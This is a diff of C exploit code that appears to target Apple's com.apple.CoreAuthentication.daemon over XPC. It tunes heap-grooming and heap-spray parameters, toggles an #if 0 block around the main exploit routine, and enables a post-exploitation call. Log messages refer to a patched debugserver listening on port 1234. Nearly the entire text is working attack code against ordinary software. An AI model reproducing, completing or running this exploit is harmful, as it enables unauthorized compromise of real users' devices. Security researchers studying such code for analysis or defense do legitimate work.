@@ -213,8 +213,8 @@ build_overflower_shm(
 }
 
 // 0x2000 works but is big
-//#define GROOM_SIZE 0x2000
 #define GROOM_SIZE 0x1000
+//#define GROOM_SIZE 0x1000
 static oxpc_object_t
 add_heap_groom_to_dictionary(oxpc_object_t dict)
 {
@@ -746,7 +746,7 @@ add_heap_spray_to_dictionary(
   void* heapspray_contents =  (void*) build_spray_page();
   
   size_t heapspray_page_size = 0x4000;
-  size_t n_heapspray_pages = 0x100; // 0x100 works too
+  size_t n_heapspray_pages = 0x200; // 0x100 works too
   size_t full_heapspray_size = n_heapspray_pages * heapspray_page_size;
   
   kern_return_t err;
@@ -945,7 +945,7 @@ sploit(
 
 
 int do_exploit() {
-//#if 0
+#if 0
   logMsg("starting exploit\n");
   char* target_service_name = "com.apple.CoreAuthentication.daemon";
   char* target_selector = "connectToExistingContext:callback:reply:";
@@ -973,7 +973,7 @@ int do_exploit() {
   logMsg("patched debugserver listening on port 1234");
   logMsg("press ps for process listing");
   
-//#endif
-  //do_post_exploit(mach_task_self());
+#endif
+  do_post_exploit(mach_task_self());
   return 0;
 }
